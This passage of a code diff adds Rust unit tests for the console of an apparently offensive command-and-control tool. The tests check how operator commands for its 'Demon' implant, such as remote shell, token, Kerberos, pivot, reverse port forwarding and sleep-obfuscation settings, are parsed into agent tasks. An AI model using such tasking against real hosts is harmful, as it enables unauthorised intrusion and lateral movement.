+        assert!(output.contains("Demon Commands"));
+    }
+
+    #[test]
+    fn handle_local_command_returns_none_for_remote_commands() {
+        assert!(handle_local_command("ps").is_none());
+        assert!(handle_local_command("shell whoami").is_none());
+        assert!(handle_local_command("sleep 10").is_none());
+    }
+
+    // ---- new command dispatch tests ----
+
+    #[test]
+    fn build_console_task_shell_command() {
+        let result = build_console_task("ABCD1234", "shell whoami", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("shell task should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.command_id, u32::from(DemonCommand::CommandInlineExecute).to_string());
+        assert_eq!(info.arguments.as_deref(), Some("whoami"));
+    }
+
+    #[test]
+    fn build_console_task_sleep_with_jitter() {
+        let result = build_console_task("ABCD1234", "sleep 30 50%", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("sleep task should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.command_id, u32::from(DemonCommand::CommandSleep).to_string());
+        assert_eq!(info.arguments.as_deref(), Some("30;50"));
+    }
+
+    #[test]
+    fn build_console_task_sleep_without_jitter() {
+        let result = build_console_task("ABCD1234", "sleep 10", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("sleep task should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.arguments.as_deref(), Some("10;0"));
+    }
+
+    #[test]
+    fn build_console_task_sleep_rejects_missing_delay() {
+        let result = build_console_task("ABCD1234", "sleep", "operator");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn build_console_task_dir_uses_explorer_format() {
+        let result = build_console_task("ABCD1234", "dir C:\\Temp", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("dir task should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.command_id, u32::from(DemonCommand::CommandFs).to_string());
+        assert_eq!(info.sub_command.as_deref(), Some("dir"));
+        assert!(info.arguments.as_deref().unwrap_or_default().contains("C:\\Temp"));
+    }
+
+    #[test]
+    fn build_console_task_cp_requires_two_args() {
+        let result = build_console_task("ABCD1234", "cp /tmp/a", "operator");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn build_console_task_cp_sends_both_paths() {
+        let result = build_console_task("ABCD1234", "cp /tmp/a /tmp/b", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("cp task should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.sub_command.as_deref(), Some("cp"));
+        assert_eq!(info.arguments.as_deref(), Some("/tmp/a;/tmp/b"));
+    }
+
+    #[test]
+    fn build_console_task_mv_sends_both_paths() {
+        let result = build_console_task("ABCD1234", "mv /tmp/a /tmp/b", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("mv task should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.sub_command.as_deref(), Some("move"));
+    }
+
+    #[test]
+    fn build_console_task_token_list() {
+        let result = build_console_task("ABCD1234", "token list", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("token task should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.command_id, u32::from(DemonCommand::CommandToken).to_string());
+        assert_eq!(info.sub_command.as_deref(), Some("list"));
+    }
+
+    #[test]
+    fn build_console_task_token_requires_subcommand() {
+        let result = build_console_task("ABCD1234", "token", "operator");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn build_console_task_net_domain() {
+        let result = build_console_task("ABCD1234", "net domain", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("net task should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.command_id, u32::from(DemonCommand::CommandNet).to_string());
+        assert_eq!(info.sub_command.as_deref(), Some("domain"));
+    }
+
+    #[test]
+    fn build_console_task_config_sets_subcommand() {
+        let result = build_console_task("ABCD1234", "config sleep-obf true", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("config task should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.command_id, u32::from(DemonCommand::CommandConfig).to_string());
+        assert_eq!(info.sub_command.as_deref(), Some("sleep-obf"));
+        assert_eq!(info.arguments.as_deref(), Some("true"));
+    }
+
+    #[test]
+    fn build_console_task_pivot_requires_subcommand() {
+        let result = build_console_task("ABCD1234", "pivot", "operator");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn build_console_task_kerberos_luid() {
+        let result = build_console_task("ABCD1234", "kerberos luid", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("kerberos task should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.command_id, u32::from(DemonCommand::CommandKerberos).to_string());
+        assert_eq!(info.sub_command.as_deref(), Some("luid"));
+    }
+
+    #[test]
+    fn build_console_task_rportfwd_list() {
+        let result = build_console_task("ABCD1234", "rportfwd list", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("rportfwd task should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.command_id, u32::from(DemonCommand::CommandSocket).to_string());
+        assert_eq!(info.sub_command.as_deref(), Some("rportfwd list"));
+    }
+
+    #[test]
+    fn build_console_task_proc_modules() {
+        let result = build_console_task("ABCD1234", "proc modules", "operator");
+        let msg = result.unwrap_or_else(|e| panic!("proc modules should build: {e}"));
+        let (_, info) = unwrap_agent_task(msg);
+        assert_eq!(info.command_id, u32::from(DemonCommand::CommandProc).to_string());
+        assert_eq!(info.sub_command.as_deref(), Some("modules"));
+    }
+
+    #[test]
+    fn build_console_task_proc_invalid_subcommand() {
+        let result = build_console_task("ABCD1234", "proc bogus", "operator");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn build_console_task_help_is_not_dispatched_remotely() {
+        let result = build_console_task("ABCD1234", "help", "operator");
+        assert!(result.is_err(), "help should not produce a remote task");
+    }
+
+    #[test]
+    fn build_help_output_full_table_lists_all_commands() {
+        let output = build_help_output(None);
+        for spec in &CONSOLE_COMMANDS {
+            assert!(output.contains(spec.name), "help table should contain `{}`", spec.name);
+        }
+    }
+
+    #[test]
+    fn build_help_output_specific_command_shows_details() {
+        let output = build_help_output(Some("token"));
+        assert!(output.contains("token"));
+        assert!(output.contains("Usage:"));
+        assert!(output.contains("Type:"));
+        assert!(output.contains("Description:"));
+    }
+
+    #[test]
+    fn build_help_output_alias_resolves() {
+        let output = build_help_output(Some("bof"));
+        assert!(output.contains("inline-execute"));
+    }
+
+    #[test]
+    fn console_commands_all_have_descriptions() {
+        for spec in &CONSOLE_COMMANDS {
+            assert!(!spec.description.is_empty(), "command `{}` missing description", spec.name);
+            assert!(!spec.cmd_type.is_empty(), "command `{}` missing type", spec.name);
+            assert!(!spec.usage.is_empty(), "command `{}` missing usage", spec.name);
+        }
+    }
+
+    #[test]
+    fn console_commands_names_are_unique() {
+        let mut seen = std::collections::HashSet::new();
+        for spec in &CONSOLE_COMMANDS {
+            assert!(seen.insert(spec.name), "duplicate command name: {}", spec.name);
+        }
+    }
+
+    #[test]
+    fn completion_includes_new_commands() {
+        let all = console_completion_candidates("");
+        assert!(all.contains(&"shell"));
+        assert!(all.contains(&"sleep"));
+        assert!(all.contains(&"token"));
+        assert!(all.contains(&"inline-execute"));
+        assert!(all.contains(&"net"));
+        assert!(all.contains(&"config"));
+        assert!(all.contains(&"help"));
+    }
+
+    #[test]
+    fn completion_pivot_matches_p_prefix() {
+        let matches = console_completion_candidates("pi");
+        assert!(matches.contains(&"pivot"));
     }
 }
